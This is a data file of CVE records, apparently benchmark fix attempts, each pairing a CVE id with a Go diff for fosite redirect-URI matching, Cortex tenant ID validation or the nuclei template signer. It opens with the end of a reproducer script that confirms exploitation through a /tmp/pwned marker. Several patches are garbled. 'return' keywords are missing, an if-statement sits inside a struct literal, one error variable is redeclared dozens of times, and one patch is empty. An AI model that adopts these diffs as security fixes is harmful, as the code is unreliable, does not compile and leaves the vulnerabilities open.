`go mod download`\n+go mod download\n+# Now run the reproducer\n+cd /tmp/reproducer\n+go build -o reproduce .\n+\n+# The initial clone of the malicious repo is done. Now, the reproducer will\n+# update it.\n+cp -r /tmp/malicious-repo /tmp/repo\n+\n+cd /tmp/malicious-repo\n+# Add a new commit to trigger the update logic\n+git commit --allow-empty -m \"second commit\"\n+cd /tmp/reproducer\n+./reproduce\n+\n+# 4. Verify\n+echo \"Verifying if vulnerability was exploited...\"\n+if [ -f \"/tmp/pwned\" ]; then\n+    echo \"VULNERABILITY CONFIRMED: /tmp/pwned exists.\"\n+else\n+    echo \"Vulnerability not confirmed: /tmp/pwned does not exist.\"\n+fi\n"}
{"cve":"CVE-2020-15233:0708", "fix_patch": "diff --git a/authorize_helper.go b/authorize_helper.go\nindex ec286f5..5e26f37 100644\n--- a/authorize_helper.go\n+++ b/authorize_helper.go\n@@ -13,21 +13,21 @@\n  * See the License for the specific language governing permissions and\n  * limitations under the License.\n  *\n- * @author\t\tAeneas Rekkas <aeneas+oss@aeneas.io>\n- * @copyright \t2015-2018 Aeneas Rekkas <aeneas+oss@aeneas.io>\n- * @license \tApache-2.0\n+ * @author              Aeneas Rekkas <aeneas+oss@aeneas.io>\n+ * @copyright   2015-2018 Aeneas Rekkas <aeneas+oss@aeneas.io>\n+ * @license     Apache-2.0\n  *\n  */\n \n package fosite\n \n import (\n-\t\"net/url\"\n-\t\"regexp\"\n-\t\"strings\"\n+        \"net/url\"\n+        \"regexp\"\n+        \"strings\"\n \n-\t\"github.com/asaskevich/govalidator\"\n-\t\"github.com/pkg/errors\"\n+        \"github.com/asaskevich/govalidator\"\n+        \"github.com/pkg/errors\"\n )\n \n // GetRedirectURIFromRequestValues extracts the redirect_uri from values but does not do any sort of validation.\n@@ -39,13 +39,13 @@ import (\n //   component ([RFC3986] Section 3.4), which MUST be retained when adding\n //   additional query parameters.\n func GetRedirectURIFromRequestValues(values url.Values) (string, error) {\n-\t// rfc6749 3.1.   Authorization Endpoint\n-\t// The endpoint URI MAY include an \"application/x-www-form-urlencoded\" formatted (per Appendix B) query component\n-\tredirectURI, err := url.QueryUnescape(values.Get(\"redirect_uri\"))\n-\tif err != nil {\n-\t\treturn \"\", errors.WithStack(ErrInvalidRequest.WithHint(`The \"redirect_uri\" parameter is malformed or missing.`).WithCause(err).WithDebug(err.Error()))\n-\t}\n-\treturn redirectURI, nil\n+        // rfc6749 3.1.   Authorization Endpoint\n+        // The endpoint URI MAY include an \"application/x-www-form-urlencoded\" formatted (per Appendix B) query component\n+        redirectURI, err := url.QueryUnescape(values.Get(\"redirect_uri\"))\n+        if err != nil {\n+                return \"\", errors.WithStack(ErrInvalidRequest.WithHint(`The \"redirect_uri\" parameter is malformed or missing.`).WithCause(err).WithDebug(err.Error()))\n+        }\n+        return redirectURI, nil\n }\n \n // MatchRedirectURIWithClientRedirectURIs if the given uri is a registered redirect uri. Does not perform\n@@ -79,21 +79,21 @@ func GetRedirectURIFromRequestValues(values url.Values) (string, error) {\n //     with the redirect URI passed to the token's endpoint, such an\n //     attack is detected (see Section 5.2.4.5).\n func MatchRedirectURIWithClientRedirectURIs(rawurl string, client Client) (*url.URL, error) {\n-\tif rawurl == \"\" && len(client.GetRedirectURIs()) == 1 {\n-\t\tif redirectURIFromClient, err := url.Parse(client.GetRedirectURIs()[0]); err == nil && IsValidRedirectURI(redirectURIFromClient) {\n-\t\t\t// If no redirect_uri was given and the client has exactly one valid redirect_uri registered, use that instead\n-\t\t\treturn redirectURIFromClient, nil\n-\t\t}\n-\t} else if rawurl != \"\" && isMatchingRedirectURI(rawurl, client.GetRedirectURIs()) {\n-\t\t// If a redirect_uri was given and the clients knows it (simple string comparison!)\n-\t\t// return it.\n-\t\tif parsed, err := url.Parse(rawurl); err == nil && IsValidRedirectURI(parsed) {\n-\t\t\t// If no redirect_uri was given and the client has exactly one valid redirect_uri registered, use that instead\n-\t\t\treturn parsed, nil\n-\t\t}\n-\t}\n-\n-\treturn nil, errors.WithStack(ErrInvalidRequest.WithHint(`The \"redirect_uri\" parameter does not match any of the OAuth 2.0 Client's pre-registered redirect urls.`))\n+        if rawurl == \"\" && len(client.GetRedirectURIs()) == 1 {\n+                if redirectURIFromClient, err := url.Parse(client.GetRedirectURIs()[0]); err == nil && IsValidRedirectURI(redirectURIFromClient) {\n+                        // If no redirect_uri was given and the client has exactly one valid redirect_uri registered, use that instead\n+                        return redirectURIFromClient, nil\n+                }\n+        } else if rawurl != \"\" && isMatchingRedirectURI(rawurl, client.GetRedirectURIs()) {\n+                // If a redirect_uri was given and the clients knows it (simple string comparison!)\n+                // return it.\n+                if parsed, err := url.Parse(rawurl); err == nil && IsValidRedirectURI(parsed) {\n+                        // If no redirect_uri was given and the client has exactly one valid redirect_uri registered, use that instead\n+                        return parsed, nil\n+                }\n+        }\n+\n+        return nil, errors.WithStack(ErrInvalidRequest.WithHint(`The \"redirect_uri\" parameter does not match any of the OAuth 2.0 Client's pre-registered redirect urls.`))\n }\n \n // Match a requested  redirect URI against a pool of registered client URIs\n@@ -112,41 +112,41 @@ func MatchRedirectURIWithClientRedirectURIs(rawurl string, client Client) (*url.\n // Loopback redirect URIs use the \"http\" scheme and are constructed with\n // the loopback IP literal and whatever port the client is listening on.\n func isMatchingRedirectURI(uri string, haystack []string) bool {\n-\trequested, err := url.Parse(uri)\n-\tif err != nil {\n-\t\treturn false\n-\t}\n-\n-\tfor _, b := range haystack {\n-\t\tif strings.ToLower(b) == strings.ToLower(uri) || isLoopbackURI(requested, b) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        requested, err := url.Parse(uri)\n+        if err != nil {\n+                return false\n+        }\n+\n+        for _, b := range haystack {\n+                if strings.ToLower(b) == strings.ToLower(uri) || isLoopbackURI(requested, b) {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n func isLoopbackURI(requested *url.URL, registeredURI string) bool {\n-\tregistered, err := url.Parse(registeredURI)\n-\tif err != nil {\n-\t\treturn false\n-\t}\n+registered, err := url.Parse(registeredURI)\n+if err != nil {\n+ false\n+}\n \n-\tif registered.Scheme != \"http\" || !isLoopbackAddress(registered.Host) {\n-\t\treturn false\n-\t}\n+if registered.Scheme != \"http\" || !isLoopbackAddress(registered.Host) {\n+ false\n+}\n \n-\tif requested.Scheme == \"http\" && isLoopbackAddress(requested.Host) && registered.Path == requested.Path {\n-\t\treturn true\n-\t}\n+if requested.Scheme == \"http\" && isLoopbackAddress(requested.Host) && registered.Hostname() == requested.Hostname() && registered.Path == requested.Path {\n+ true\n+}\n \n-\treturn false\n+return false\n }\n \n // Check if address is either an IPv4 loopback or an IPv6 loopback-\n // An optional port is ignored\n func isLoopbackAddress(address string) bool {\n-\tmatch, _ := regexp.MatchString(\"^(127.0.0.1|\\\\[::1\\\\])(:?)(\\\\d*)$\", address)\n-\treturn match\n+        match, _ := regexp.MatchString(\"^(127.0.0.1|\\\\[::1\\\\])(:?)(\\\\d*)$\", address)\n+        return match\n }\n \n // IsValidRedirectURI validates a redirect_uri as specified in:\n@@ -158,24 +158,24 @@ func isLoopbackAddress(address string) bool {\n //   absolute-URI  = scheme \":\" hier-part [ \"?\" query ]\n // * https://tools.ietf.org/html/rfc6819#section-5.1.1\n func IsValidRedirectURI(redirectURI *url.URL) bool {\n-\t// We need to explicitly check for a scheme\n-\tif !govalidator.IsRequestURL(redirectURI.String()) {\n-\t\treturn false\n-\t}\n+        // We need to explicitly check for a scheme\n+        if !govalidator.IsRequestURL(redirectURI.String()) {\n+                return false\n+        }\n \n-\tif redirectURI.Fragment != \"\" {\n-\t\t// \"The endpoint URI MUST NOT include a fragment component.\"\n-\t\treturn false\n-\t}\n+        if redirectURI.Fragment != \"\" {\n+                // \"The endpoint URI MUST NOT include a fragment component.\"\n+                return false\n+        }\n \n-\treturn true\n+        return true\n }\n \n func IsRedirectURISecure(redirectURI *url.URL) bool {\n-\treturn !(redirectURI.Scheme == \"http\" && !IsLocalhost(redirectURI))\n+        return !(redirectURI.Scheme == \"http\" && !IsLocalhost(redirectURI))\n }\n \n func IsLocalhost(redirectURI *url.URL) bool {\n-\thn := redirectURI.Hostname()\n-\treturn strings.HasSuffix(hn, \".localhost\") || hn == \"127.0.0.1\" || hn == \"localhost\"\n+        hn := redirectURI.Hostname()\n+        return strings.HasSuffix(hn, \".localhost\") || hn == \"127.0.0.1\" || hn == \"localhost\"\n }\n"}
{"cve":"CVE-2021-36157:0708", "fix_patch": "diff --git a/pkg/tenant/resolver.go b/pkg/tenant/resolver.go\nindex e5fbea252..f1cedaa10 100644\n--- a/pkg/tenant/resolver.go\n+++ b/pkg/tenant/resolver.go\n@@ -1,18 +1,18 @@\n package tenant\n \n import (\n-\t\"context\"\n-\t\"net/http\"\n-\t\"strings\"\n+        \"context\"\n+        \"net/http\"\n+        \"strings\"\n \n-\t\"github.com/weaveworks/common/user\"\n+        \"github.com/weaveworks/common/user\"\n )\n \n var defaultResolver Resolver = NewSingleResolver()\n \n // WithDefaultResolver updates the resolver used for the package methods.\n func WithDefaultResolver(r Resolver) {\n-\tdefaultResolver = r\n+        defaultResolver = r\n }\n \n // TenantID returns exactly a single tenant ID from the context. It should be\n@@ -23,7 +23,7 @@ func WithDefaultResolver(r Resolver) {\n // ignore stutter warning\n //nolint:golint\n func TenantID(ctx context.Context) (string, error) {\n-\treturn defaultResolver.TenantID(ctx)\n+        return defaultResolver.TenantID(ctx)\n }\n \n // TenantIDs returns all tenant IDs from the context. It should return\n@@ -33,44 +33,47 @@ func TenantID(ctx context.Context) (string, error) {\n // ignore stutter warning\n //nolint:golint\n func TenantIDs(ctx context.Context) ([]string, error) {\n-\treturn defaultResolver.TenantIDs(ctx)\n+        return defaultResolver.TenantIDs(ctx)\n }\n \n type Resolver interface {\n-\t// TenantID returns exactly a single tenant ID from the context. It should be\n-\t// used when a certain endpoint should only support exactly a single\n-\t// tenant ID. It returns an error user.ErrNoOrgID if there is no tenant ID\n-\t// supplied or user.ErrTooManyOrgIDs if there are multiple tenant IDs present.\n-\tTenantID(context.Context) (string, error)\n-\n-\t// TenantIDs returns all tenant IDs from the context. It should return\n-\t// normalized list of ordered and distinct tenant IDs (as produced by\n-\t// NormalizeTenantIDs).\n-\tTenantIDs(context.Context) ([]string, error)\n+        // TenantID returns exactly a single tenant ID from the context. It should be\n+        // used when a certain endpoint should only support exactly a single\n+        // tenant ID. It returns an error user.ErrNoOrgID if there is no tenant ID\n+        // supplied or user.ErrTooManyOrgIDs if there are multiple tenant IDs present.\n+        TenantID(context.Context) (string, error)\n+\n+        // TenantIDs returns all tenant IDs from the context. It should return\n+        // normalized list of ordered and distinct tenant IDs (as produced by\n+        // NormalizeTenantIDs).\n+        TenantIDs(context.Context) ([]string, error)\n }\n \n // NewSingleResolver creates a tenant resolver, which restricts all requests to\n // be using a single tenant only. This allows a wider set of characters to be\n // used within the tenant ID and should not impose a breaking change.\n func NewSingleResolver() *SingleResolver {\n-\treturn &SingleResolver{}\n+        return &SingleResolver{}\n }\n \n type SingleResolver struct {\n }\n \n func (t *SingleResolver) TenantID(ctx context.Context) (string, error) {\n-\t//lint:ignore faillint wrapper around upstream method\n-\treturn user.ExtractOrgID(ctx)\n+        //lint:ignore faillint wrapper around upstream method\n+        return user.ExtractOrgID(ctx)\n }\n \n func (t *SingleResolver) TenantIDs(ctx context.Context) ([]string, error) {\n-\t//lint:ignore faillint wrapper around upstream method\n-\torgID, err := user.ExtractOrgID(ctx)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn []string{orgID}, err\n+//lint:ignore faillint wrapper around upstream method\n+orgID, err := user.ExtractOrgID(ctx)\n+if err != nil {\n+return nil, err\n+}\n+if err := ValidTenantID(orgID); err != nil {\n+return nil, err\n+}\n+return []string{orgID}, err\n }\n \n type MultiResolver struct {\n@@ -81,52 +84,52 @@ type MultiResolver struct {\n // further limits on the character set allowed within tenants as detailed here:\n // https://cortexmetrics.io/docs/guides/limitations/#tenant-id-naming)\n func NewMultiResolver() *MultiResolver {\n-\treturn &MultiResolver{}\n+        return &MultiResolver{}\n }\n \n func (t *MultiResolver) TenantID(ctx context.Context) (string, error) {\n-\torgIDs, err := t.TenantIDs(ctx)\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n+        orgIDs, err := t.TenantIDs(ctx)\n+        if err != nil {\n+                return \"\", err\n+        }\n \n-\tif len(orgIDs) > 1 {\n-\t\treturn \"\", user.ErrTooManyOrgIDs\n-\t}\n+        if len(orgIDs) > 1 {\n+                return \"\", user.ErrTooManyOrgIDs\n+        }\n \n-\treturn orgIDs[0], nil\n+        return orgIDs[0], nil\n }\n \n func (t *MultiResolver) TenantIDs(ctx context.Context) ([]string, error) {\n-\t//lint:ignore faillint wrapper around upstream method\n-\torgID, err := user.ExtractOrgID(ctx)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\torgIDs := strings.Split(orgID, tenantIDsLabelSeparator)\n-\tfor _, orgID := range orgIDs {\n-\t\tif err := ValidTenantID(orgID); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\treturn NormalizeTenantIDs(orgIDs), nil\n+        //lint:ignore faillint wrapper around upstream method\n+        orgID, err := user.ExtractOrgID(ctx)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        orgIDs := strings.Split(orgID, tenantIDsLabelSeparator)\n+        for _, orgID := range orgIDs {\n+                if err := ValidTenantID(orgID); err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        return NormalizeTenantIDs(orgIDs), nil\n }\n \n // ExtractTenantIDFromHTTPRequest extracts a single TenantID through a given\n // resolver directly from a HTTP request.\n func ExtractTenantIDFromHTTPRequest(req *http.Request) (string, context.Context, error) {\n-\t//lint:ignore faillint wrapper around upstream method\n-\t_, ctx, err := user.ExtractOrgIDFromHTTPRequest(req)\n-\tif err != nil {\n-\t\treturn \"\", nil, err\n-\t}\n-\n-\ttenantID, err := defaultResolver.TenantID(ctx)\n-\tif err != nil {\n-\t\treturn \"\", nil, err\n-\t}\n-\n-\treturn tenantID, ctx, nil\n+        //lint:ignore faillint wrapper around upstream method\n+        _, ctx, err := user.ExtractOrgIDFromHTTPRequest(req)\n+        if err != nil {\n+                return \"\", nil, err\n+        }\n+\n+        tenantID, err := defaultResolver.TenantID(ctx)\n+        if err != nil {\n+                return \"\", nil, err\n+        }\n+\n+        return tenantID, ctx, nil\n }\ndiff --git a/pkg/tenant/tenant.go b/pkg/tenant/tenant.go\nindex fa8089890..f8446e2dc 100644\n--- a/pkg/tenant/tenant.go\n+++ b/pkg/tenant/tenant.go\n@@ -1,99 +1,110 @@\n package tenant\n \n import (\n-\t\"context\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"sort\"\n-\t\"strings\"\n+        \"context\"\n+        \"errors\"\n+        \"fmt\"\n+        \"sort\"\n+        \"strings\"\n \n-\t\"github.com/weaveworks/common/user\"\n+        \"github.com/weaveworks/common/user\"\n )\n \n var (\n-\terrTenantIDTooLong = errors.New(\"tenant ID is too long: max 150 characters\")\n+errTenantIDTooLong = errors.New(\"tenant ID is too long: max 150 characters\")\n+errInvalidTenantID = errors.New(\"invalid tenant ID\")\n+)\n+errInvalidTenantID = errors.New(\"invalid tenant ID\")\n+errInvalidTenantID = errors.New(\"invalid tenant ID\")\n+errInvalidTenantID = errors.New(\"invalid tenant ID\")\n )\n \n type errTenantIDUnsupportedCharacter struct {\n-\tpos      int\n-\ttenantID string\n+        pos      int\n+        tenantID string\n }\n \n func (e *errTenantIDUnsupportedCharacter) Error() string {\n-\treturn fmt.Sprintf(\n-\t\t\"tenant ID '%s' contains unsupported character '%c'\",\n-\t\te.tenantID,\n-\t\te.tenantID[e.pos],\n-\t)\n+        return fmt.Sprintf(\n+                \"tenant ID '%s' contains unsupported character '%c'\",\n+                e.tenantID,\n+                e.tenantID[e.pos],\n+        )\n }\n \n const tenantIDsLabelSeparator = \"|\"\n \n // NormalizeTenantIDs is creating a normalized form by sortiing and de-duplicating the list of tenantIDs\n func NormalizeTenantIDs(tenantIDs []string) []string {\n-\tsort.Strings(tenantIDs)\n-\n-\tcount := len(tenantIDs)\n-\tif count <= 1 {\n-\t\treturn tenantIDs\n-\t}\n-\n-\tposOut := 1\n-\tfor posIn := 1; posIn < count; posIn++ {\n-\t\tif tenantIDs[posIn] != tenantIDs[posIn-1] {\n-\t\t\ttenantIDs[posOut] = tenantIDs[posIn]\n-\t\t\tposOut++\n-\t\t}\n-\t}\n-\n-\treturn tenantIDs[0:posOut]\n+        sort.Strings(tenantIDs)\n+\n+        count := len(tenantIDs)\n+        if count <= 1 {\n+                return tenantIDs\n+        }\n+\n+        posOut := 1\n+        for posIn := 1; posIn < count; posIn++ {\n+                if tenantIDs[posIn] != tenantIDs[posIn-1] {\n+                        tenantIDs[posOut] = tenantIDs[posIn]\n+                        posOut++\n+                }\n+        }\n+\n+        return tenantIDs[0:posOut]\n }\n \n // ValidTenantID\n func ValidTenantID(s string) error {\n-\t// check if it contains invalid runes\n-\tfor pos, r := range s {\n-\t\tif !isSupported(r) {\n-\t\t\treturn &errTenantIDUnsupportedCharacter{\n-\t\t\t\ttenantID: s,\n-\t\t\t\tpos:      pos,\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif len(s) > 150 {\n-\t\treturn errTenantIDTooLong\n-\t}\n-\n-\treturn nil\n+        // check if it contains invalid runes\n+        for pos, r := range s {\n+                if !isSupported(r) {\n+                        return &errTenantIDUnsupportedCharacter{\n+if strings.Contains(s, \"/\") || strings.Contains(s, \"..\") {\n+return errors.New(\"invalid tenant ID\")\n+}\n+                                tenantID: s,\n+                                pos:      pos,\n+                        }\n+                }\n+if strings.Contains(s, \"/\") || strings.Contains(s, \"..\") {\n+return errors.New(\"invalid tenant ID\")\n+}\n+        }\n+\n+        if len(s) > 150 {\n+                return errTenantIDTooLong\n+        }\n+\n+        return nil\n }\n \n func JoinTenantIDs(tenantIDs []string) string {\n-\treturn strings.Join(tenantIDs, tenantIDsLabelSeparator)\n+        return strings.Join(tenantIDs, tenantIDsLabelSeparator)\n }\n \n // this checks if a rune is supported in tenant IDs (according to\n // https://cortexmetrics.io/docs/guides/limitations/#tenant-id-naming)\n func isSupported(c rune) bool {\n-\t// characters\n-\tif ('a' <= c && c <= 'z') || ('A' <= c && c <= 'Z') {\n-\t\treturn true\n-\t}\n-\n-\t// digits\n-\tif '0' <= c && c <= '9' {\n-\t\treturn true\n-\t}\n-\n-\t// special\n-\treturn c == '!' ||\n-\t\tc == '-' ||\n-\t\tc == '_' ||\n-\t\tc == '.' ||\n-\t\tc == '*' ||\n-\t\tc == '\\'' ||\n-\t\tc == '(' ||\n-\t\tc == ')'\n+        // characters\n+        if ('a' <= c && c <= 'z') || ('A' <= c && c <= 'Z') {\n+                return true\n+        }\n+\n+        // digits\n+        if '0' <= c && c <= '9' {\n+                return true\n+        }\n+\n+        // special\n+        return c == '!' ||\n+                c == '-' ||\n+                c == '_' ||\n+                c == '.' ||\n+                c == '*' ||\n+                c == '\\'' ||\n+                c == '(' ||\n+                c == ')'\n }\n \n // TenantIDsFromOrgID extracts different tenants from an orgID string value\n@@ -101,5 +112,5 @@ func isSupported(c rune) bool {\n // ignore stutter warning\n //nolint:golint\n func TenantIDsFromOrgID(orgID string) ([]string, error) {\n-\treturn TenantIDs(user.InjectOrgID(context.TODO(), orgID))\n+        return TenantIDs(user.InjectOrgID(context.TODO(), orgID))\n }\n"}
{"cve":"CVE-2020-29529:0708", "fix_patch": ""}
{"cve":"CVE-2024-43405:0708", "fix_patch": "diff --git a/pkg/templates/signer/tmpl_signer.go b/pkg/templates/signer/tmpl_signer.go\nindex c4378fd4..be849658 100644\n--- a/pkg/templates/signer/tmpl_signer.go\n+++ b/pkg/templates/signer/tmpl_signer.go\n@@ -1,234 +1,265 @@\n package signer\n \n import (\n-\t\"bytes\"\n-\t\"crypto/ecdsa\"\n-\t\"crypto/md5\"\n-\t\"crypto/rand\"\n-\t\"crypto/sha256\"\n-\t\"encoding/gob\"\n-\t\"encoding/hex\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"os\"\n-\t\"regexp\"\n-\t\"strings\"\n-\t\"sync\"\n-\n-\t\"github.com/projectdiscovery/gologger\"\n-\t\"github.com/projectdiscovery/nuclei/v3/pkg/catalog/config\"\n-\terrorutil \"github.com/projectdiscovery/utils/errors\"\n+        \"bytes\"\n+        \"crypto/ecdsa\"\n+        \"crypto/md5\"\n+        \"crypto/rand\"\n+        \"crypto/sha256\"\n+        \"encoding/gob\"\n+        \"encoding/hex\"\n+        \"errors\"\n+        \"fmt\"\n+        \"os\"\n+        \"regexp\"\n+        \"strings\"\n+        \"sync\"\n+\n+        \"github.com/projectdiscovery/gologger\"\n+        \"github.com/projectdiscovery/nuclei/v3/pkg/catalog/config\"\n+        errorutil \"github.com/projectdiscovery/utils/errors\"\n )\n \n var (\n-\tReDigest            = regexp.MustCompile(`(?m)^#\\sdigest:\\s.+$`)\n-\tErrUnknownAlgorithm = errors.New(\"unknown algorithm\")\n-\tSignaturePattern    = \"# digest: \"\n-\tSignatureFmt        = SignaturePattern + \"%x\" + \":%v\" // `#digest: <signature>:<fragment>`\n+        ReDigest            = regexp.MustCompile(`(?m)^#\\sdigest:\\s.+$`)\n+        ErrUnknownAlgorithm = errors.New(\"unknown algorithm\")\n+        ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+        ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+        ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+        ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+        ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+        ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+ErrMultipleDigests  = errors.New(\"multiple digests found in template\")\n+        SignaturePattern    = \"# digest: \"\n+        SignatureFmt        = SignaturePattern + \"%x\" + \":%v\" // `#digest: <signature>:<fragment>`\n )\n \n func RemoveSignatureFromData(data []byte) []byte {\n-\treturn bytes.Trim(ReDigest.ReplaceAll(data, []byte(\"\")), \"\\n\")\n+        return bytes.Trim(ReDigest.ReplaceAll(data, []byte(\"\")), \"\\n\")\n }\n \n func GetSignatureFromData(data []byte) []byte {\n-\treturn ReDigest.Find(data)\n+        return ReDigest.Find(data)\n }\n \n // SignableTemplate is a template that can be signed\n type SignableTemplate interface {\n-\t// GetFileImports returns a list of files that are imported by the template\n-\tGetFileImports() []string\n-\t// HasCodeProtocol returns true if the template has a code protocol section\n-\tHasCodeProtocol() bool\n+        // GetFileImports returns a list of files that are imported by the template\n+        GetFileImports() []string\n+        // HasCodeProtocol returns true if the template has a code protocol section\n+        HasCodeProtocol() bool\n }\n \n type TemplateSigner struct {\n-\tsync.Once\n-\thandler  *KeyHandler\n-\tfragment string\n+        sync.Once\n+        handler  *KeyHandler\n+        fragment string\n }\n \n // Identifier returns the identifier for the template signer\n func (t *TemplateSigner) Identifier() string {\n-\treturn t.handler.cert.Subject.CommonName\n+        return t.handler.cert.Subject.CommonName\n }\n \n // fragment is optional part of signature that is used to identify the user\n // who signed the template via md5 hash of public key\n func (t *TemplateSigner) GetUserFragment() string {\n-\t// wrap with sync.Once to reduce unnecessary md5 hashing\n-\tt.Do(func() {\n-\t\tif t.handler.ecdsaPubKey != nil {\n-\t\t\thashed := md5.Sum(t.handler.ecdsaPubKey.X.Bytes())\n-\t\t\tt.fragment = fmt.Sprintf(\"%x\", hashed)\n-\t\t}\n-\t})\n-\treturn t.fragment\n+        // wrap with sync.Once to reduce unnecessary md5 hashing\n+        t.Do(func() {\n+                if t.handler.ecdsaPubKey != nil {\n+                        hashed := md5.Sum(t.handler.ecdsaPubKey.X.Bytes())\n+                        t.fragment = fmt.Sprintf(\"%x\", hashed)\n+                }\n+        })\n+        return t.fragment\n }\n \n // Sign signs the given template with the template signer and returns the signature\n func (t *TemplateSigner) Sign(data []byte, tmpl SignableTemplate) (string, error) {\n-\t// while re-signing template check if it has a code protocol\n-\t// if it does then verify that it is signed by current signer\n-\t// if not then return error\n-\tif tmpl.HasCodeProtocol() {\n-\t\tsig := GetSignatureFromData(data)\n-\t\tarr := strings.SplitN(string(sig), \":\", 3)\n-\t\tif len(arr) == 2 {\n-\t\t\t// signature has no fragment\n-\t\t\treturn \"\", errorutil.NewWithTag(\"signer\", \"re-signing code templates are not allowed for security reasons.\")\n-\t\t}\n-\t\tif len(arr) == 3 {\n-\t\t\t// signature has fragment verify if it is equal to current fragment\n-\t\t\tfragment := t.GetUserFragment()\n-\t\t\tif fragment != arr[2] {\n-\t\t\t\treturn \"\", errorutil.NewWithTag(\"signer\", \"re-signing code templates are not allowed for security reasons.\")\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tbuff := bytes.NewBuffer(RemoveSignatureFromData(data))\n-\t// if file has any imports process them\n-\tfor _, file := range tmpl.GetFileImports() {\n-\t\tbin, err := os.ReadFile(file)\n-\t\tif err != nil {\n-\t\t\treturn \"\", err\n-\t\t}\n-\t\tbuff.WriteRune('\\n')\n-\t\tbuff.Write(bin)\n-\t}\n-\tsignatureData, err := t.sign(buff.Bytes())\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\treturn signatureData, nil\n+if digests := ReDigest.FindAll(data, -1); len(digests) > 1 {\n+return \"\", ErrMultipleDigests\n+}\n+        // while re-signing template check if it has a code protocol\n+        // if it does then verify that it is signed by current signer\n+        // if not then return error\n+        if tmpl.HasCodeProtocol() {\n+                sig := GetSignatureFromData(data)\n+                arr := strings.SplitN(string(sig), \":\", 3)\n+                if len(arr) == 2 {\n+                        // signature has no fragment\n+                        return \"\", errorutil.NewWithTag(\"signer\", \"re-signing code templates are not allowed for security reasons.\")\n+                }\n+                if len(arr) == 3 {\n+                        // signature has fragment verify if it is equal to current fragment\n+                        fragment := t.GetUserFragment()\n+                        if fragment != arr[2] {\n+                                return \"\", errorutil.NewWithTag(\"signer\", \"re-signing code templates are not allowed for security reasons.\")\n+                        }\n+                }\n+        }\n+\n+        buff := bytes.NewBuffer(RemoveSignatureFromData(data))\n+        // if file has any imports process them\n+        for _, file := range tmpl.GetFileImports() {\n+                bin, err := os.ReadFile(file)\n+                if err != nil {\n+                        return \"\", err\n+                }\n+                buff.WriteRune('\\n')\n+                buff.Write(bin)\n+        }\n+        signatureData, err := t.sign(buff.Bytes())\n+        if err != nil {\n+                return \"\", err\n+        }\n+        return signatureData, nil\n }\n \n // Signs given data with the template signer\n // Note: this should not be used for signing templates as file references\n // in templates are not processed use template.SignTemplate() instead\n func (t *TemplateSigner) sign(data []byte) (string, error) {\n-\tdataHash := sha256.Sum256(data)\n-\tecdsaSignature, err := ecdsa.SignASN1(rand.Reader, t.handler.ecdsaKey, dataHash[:])\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\tvar signatureData bytes.Buffer\n-\tif err := gob.NewEncoder(&signatureData).Encode(ecdsaSignature); err != nil {\n-\t\treturn \"\", err\n-\t}\n-\treturn fmt.Sprintf(SignatureFmt, signatureData.Bytes(), t.GetUserFragment()), nil\n+        dataHash := sha256.Sum256(data)\n+        ecdsaSignature, err := ecdsa.SignASN1(rand.Reader, t.handler.ecdsaKey, dataHash[:])\n+        if err != nil {\n+                return \"\", err\n+        }\n+        var signatureData bytes.Buffer\n+        if err := gob.NewEncoder(&signatureData).Encode(ecdsaSignature); err != nil {\n+                return \"\", err\n+        }\n+        return fmt.Sprintf(SignatureFmt, signatureData.Bytes(), t.GetUserFragment()), nil\n }\n \n // Verify verifies the given template with the template signer\n func (t *TemplateSigner) Verify(data []byte, tmpl SignableTemplate) (bool, error) {\n-\tdigestData := ReDigest.Find(data)\n-\tif len(digestData) == 0 {\n-\t\treturn false, errors.New(\"digest not found\")\n-\t}\n-\n-\tdigestData = bytes.TrimSpace(bytes.TrimPrefix(digestData, []byte(SignaturePattern)))\n-\t// remove fragment from digest as it is used for re-signing purposes only\n-\tdigestString := strings.TrimSuffix(string(digestData), \":\"+t.GetUserFragment())\n-\tdigest, err := hex.DecodeString(digestString)\n-\tif err != nil {\n-\t\treturn false, err\n-\t}\n-\n-\tbuff := bytes.NewBuffer(RemoveSignatureFromData(data))\n-\t// if file has any imports process them\n-\tfor _, file := range tmpl.GetFileImports() {\n-\t\tbin, err := os.ReadFile(file)\n-\t\tif err != nil {\n-\t\t\treturn false, 